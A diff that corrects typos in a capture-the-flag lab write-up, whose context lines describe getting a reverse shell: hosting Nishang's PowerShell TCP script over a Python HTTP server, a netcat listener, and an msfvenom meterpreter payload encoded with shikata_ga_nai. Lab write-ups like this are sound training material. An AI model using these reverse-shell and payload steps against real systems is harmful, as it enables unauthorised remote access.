@@ -42,7 +42,7 @@ For this command to work and get a reverse shell on our machine we need to setup
 
 -- Download Nishang "Invoke-PowerShellTcp.ps1" payload script provided by the room. Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security.
 
--- A python SimpleHTTPServer in order to host the file that the remote machine will try to donwload. We can do this by typing this command on a kali machine:
+-- A python SimpleHTTPServer in order to host the file that the remote machine will try to download. We can do this by typing this command on a kali machine:
 
 ```
 python -m SimpleHTTPServer
@@ -50,7 +50,7 @@ python -m SimpleHTTPServer
 
 ![pythonserver](https://user-images.githubusercontent.com/76821053/118032170-3fe26a00-b35f-11eb-919e-8483e5469701.png)
 
--- Start a netcat listener on the port we chose:
+-- Start a netcat listener on the same port has the payload:
 
 ![nclistener](https://user-images.githubusercontent.com/76821053/118028995-9c438a80-b35b-11eb-8463-7b4c797b97d2.png)
 
@@ -90,7 +90,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -o payl
 
 ![image](https://user-images.githubusercontent.com/76821053/131249292-4efa51fe-c0cf-4e8d-be24-6f5972d5d5ea.png)
 
-In this case i created a meterpreter .exe payload encoded with shikata_ga_nai. If we check the size of the payload we can answer on of the questions of the room.
+In this case i created a meterpreter .exe payload encoded with shikata_ga_nai. If we check the size of the payload we can answer one of the questions of the room.
 
 To upload this payload to the target machine we need once again to host this file in a SimpleHTTPServer:
 
